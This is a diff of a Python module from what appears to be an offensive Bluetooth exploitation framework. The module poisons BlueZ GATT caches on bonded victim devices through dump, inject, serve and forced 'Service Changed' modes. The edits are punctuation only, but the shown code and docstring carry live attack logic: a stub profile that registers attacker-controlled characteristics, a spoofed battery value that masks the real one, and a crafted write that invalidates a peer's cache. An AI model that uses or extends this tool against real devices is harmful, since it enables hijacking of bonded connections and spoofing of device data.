@@ -7,8 +7,8 @@ service discovery phase on subsequent reconnects. The cache is keyed by
 
 Once an attacker has bonded with the victim (e.g. via blurtooth, JustWorks,
 or a stolen LTK), the attacker can manipulate the locally-stored GATT cache
-on the victim — or pre-poison the bonded device's cache by serving a
-crafted service database during pairing — so that future legitimate
+on the victim, or pre-poison the bonded device's cache by serving a
+crafted service database during pairing, so that future legitimate
 connections to the real target route reads/writes to attacker-controlled
 characteristics.
 
@@ -23,10 +23,10 @@ Attack scenarios:
   - Replace handles for Read characteristics with handles that have Write/Notify
 
 Modes:
-  dump      — Dump cached services from local BlueZ storage for a given peer
-  inject    — Inject crafted entries into local BlueZ GATT cache
-  serve     — Act as a poisoned GATT server during next pairing (CCCD descriptor abuse)
-  service_changed — Force "Service Changed" indication to invalidate victim's cache
+  dump     , Dump cached services from local BlueZ storage for a given peer
+  inject   , Inject crafted entries into local BlueZ GATT cache
+  serve    , Act as a poisoned GATT server during next pairing (CCCD descriptor abuse)
+  service_changed, Force "Service Changed" indication to invalidate victim's cache
 
 Requires: root, write access to /var/lib/bluetooth/<adapter>/<peer>/attributes
 """
@@ -218,7 +218,7 @@ class Module(AuxiliaryModule):
         paths = _bluez_attr_paths(peer)
         if not paths:
             print_error(f"No BlueZ cache files found for {peer}")
-            print_info("Peer may not be bonded — pair first with blurtooth/bluetoothctl")
+            print_info("Peer may not be bonded, pair first with blurtooth/bluetoothctl")
             return False
 
         all_attrs = []
@@ -338,7 +338,7 @@ class Module(AuxiliaryModule):
         print_warning("via D-Bus org.bluez.GattManager1.RegisterApplication")
 
         # Generate stub profile that registers attacker-controlled chars
-        # This is a template — full implementation requires D-Bus interaction
+        # This is a template, full implementation requires D-Bus interaction
         profile_dir = f"/tmp/bluesploit_gatt_{peer.replace(':', '')}"
         os.makedirs(profile_dir, exist_ok=True)
 
@@ -350,7 +350,7 @@ class Module(AuxiliaryModule):
                     "characteristics": [
                         {
                             "uuid": "00002a19-0000-1000-8000-00805f9b34fb",
-                            "value": "FF",  # Always 100% — masks real value
+                            "value": "FF",  # Always 100%, masks real value
                             "properties": ["read", "notify"],
                         }
                     ]
@@ -408,7 +408,7 @@ class Module(AuxiliaryModule):
                     val = bytes([0x01, 0x00, 0xFF, 0xFF])
                     try:
                         await client.write_gatt_char(SERVICE_CHANGED_UUID, val)
-                        print_success("Service Changed indication sent — peer cache invalidated")
+                        print_success("Service Changed indication sent, peer cache invalidated")
                         return True
                     except Exception as e:
                         print_warning(f"Direct write failed: {e}")
